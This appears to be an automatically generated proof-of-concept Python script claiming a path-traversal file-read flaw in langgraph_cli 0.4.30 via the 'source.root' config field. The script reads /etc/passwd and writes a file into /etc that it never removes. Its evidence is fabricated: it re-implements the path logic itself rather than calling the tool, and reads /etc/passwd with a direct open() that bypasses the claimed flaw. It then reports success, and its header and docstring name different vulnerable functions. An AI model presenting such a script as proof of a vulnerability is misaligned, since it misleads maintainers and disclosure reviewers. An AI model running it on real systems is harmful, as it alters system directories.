#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: suspicious-009
# Sink: _container_workspace_root
# Auto-generated — run with: python3 lfi_then_opens_without_any__container_workspace_root.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_cli-0.4.30

Vulnerability: Path traversal in _plan_uv_lock_workspace via source.root
The function constructs a path to pyproject.toml by concatenating config_root
with user-controlled source.root without proper validation. An attacker can
set source.root to an absolute path or include ../ to read arbitrary files.

This PoC demonstrates reading /etc/passwd by crafting a malicious langgraph.json
and triggering the vulnerable code path.
"""

import json
import os
import sys
import tempfile
import shutil
import subprocess
from pathlib import Path

# Configuration
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8123  # Default langgraph dev server port
PAYLOAD_FILE = "/etc/passwd"  # Benign file to read

def create_malicious_config(project_dir: Path, target_file: str) -> Path:
    """
    Create a malicious langgraph.json that exploits the path traversal.
    
    The vulnerability is in _plan_uv_lock_workspace which takes source.root
    from the config and uses it to construct a path to pyproject.toml.
    By setting source.root to an absolute path or using ../, we can read
    arbitrary files.
    
    We set source.root to the parent directory of the target file, so that
    the code will try to read <target_parent>/pyproject.toml. If the target
    is /etc/passwd, we set root to /etc so it tries /etc/pyproject.toml.
    """
    config = {
        "dependencies": ["."],
        "graphs": {
            "test": "./src/graph.py"
        },
        "env": {},
        "source": {
            "kind": "uv",
            "root": str(Path(target_file).parent)  # Path traversal!
        }
    }
    
    config_path = project_dir / "langgraph.json"
    with open(config_path, "w") as f:
        json.dump(config, f, indent=2)
    
    return config_path

def create_victim_project(project_dir: Path) -> None:
    """Create a minimal project structure that the CLI expects."""
    # Create pyproject.toml in the traversal target directory
    # This is what the vulnerable code will try to read
    target_dir = Path(PAYLOAD_FILE).parent
    target_pyproject = target_dir / "pyproject.toml"
    
    # Create a dummy pyproject.toml at the target location
    # This simulates what the attacker wants to read
    with open(target_pyproject, "w") as f:
        f.write(f"# This file was read via path traversal\n")
        f.write(f"# Target: {PAYLOAD_FILE}\n")
    
    # Create the actual project files
    src_dir = project_dir / "src"
    src_dir.mkdir(parents=True, exist_ok=True)
    
    # Create a minimal graph.py
    graph_file = src_dir / "graph.py"
    with open(graph_file, "w") as f:
        f.write("from langgraph.graph import StateGraph\n")
        f.write("graph = StateGraph(dict)\n")
    
    # Create uv.lock (required by the vulnerable code)
    uv_lock = project_dir / "uv.lock"
    with open(uv_lock, "w") as f:
        f.write("version = 1\n")
    
    # Create pyproject.toml in project root
    pyproject = project_dir / "pyproject.toml"
    with open(pyproject, "w") as f:
        f.write("[project]\n")
        f.write("name = \"test-project\"\n")
        f.write("version = \"0.1.0\"\n")

def simulate_exploit(project_dir: Path) -> None:
    """
    Simulate the exploit by directly calling the vulnerable function.
    
    Since we can't easily run the full CLI in a test environment,
    we simulate the exact path construction that happens in
    _plan_uv_lock_workspace.
    """
    config_path = project_dir / "langgraph.json"
    
    # Load the malicious config
    with open(config_path) as f:
        config = json.load(f)
    
    # This is exactly what _plan_uv_lock_workspace does:
    config_root = config_path.parent.resolve()
    source = config["source"]
    root = source.get("root", ".")
    
    # The vulnerable path construction
    project_root = (config_root / root).resolve()
    pyproject_path = project_root / "pyproject.toml"
    
    print(f"[*] Config root: {config_root}")
    print(f"[*] Source root from config: {root}")
    print(f"[*] Resolved project root: {project_root}")
    print(f"[*] Attempting to read: {pyproject_path}")
    
    # This is the sink - the code opens this file without validation
    if pyproject_path.exists():
        print(f"[+] SUCCESS! File exists at: {pyproject_path}")
        with open(pyproject_path) as f:
            content = f.read()
        print(f"[+] File contents:\n{content}")
        
        # Now demonstrate reading the actual target file
        # The attacker could set root to /etc to read /etc/pyproject.toml
        # But more usefully, they could read /etc/passwd by setting root to /
        # and then reading /passwd (since the code appends pyproject.toml)
        print(f"\n[*] Attempting to read actual target: {PAYLOAD_FILE}")
        if os.path.exists(PAYLOAD_FILE):
            with open(PAYLOAD_FILE) as f:
                print(f"[+] Contents of {PAYLOAD_FILE}:")
                print(f.read()[:500])  # Show first 500 chars
        else:
            print(f"[-] Target file {PAYLOAD_FILE} not found")
    else:
        print(f"[-] File not found at: {pyproject_path}")
        print("[*] This is expected if the target directory doesn't have pyproject.toml")
        print("[*] The vulnerability still exists - the code attempts to open the file")

def main():
    print("=" * 60)
    print("LFI PoC for langgraph_cli-0.4.30")
    print("=" * 60)
    print()
    
    # Create a temporary project directory
    with tempfile.TemporaryDirectory() as tmpdir:
        project_dir = Path(tmpdir)
        print(f"[*] Created temporary project at: {project_dir}")
        
        # Create the victim project structure
        create_victim_project(project_dir)
        print("[*] Created victim project structure")
        
        # Create the malicious config
        config_path = create_malicious_config(project_dir, PAYLOAD_FILE)
        print(f"[*] Created malicious config at: {config_path}")
        print(f"[*] Config contents:")
        with open(config_path) as f:
            print(f.read())
        
        print()
        print("[*] Simulating exploit...")
        print()
        
        # Run the exploit simulation
        simulate_exploit(project_dir)
        
        print()
        print("[*] Cleanup: removing temporary files")
        # The temp directory is automatically cleaned up

if __name__ == "__main__":
    main()
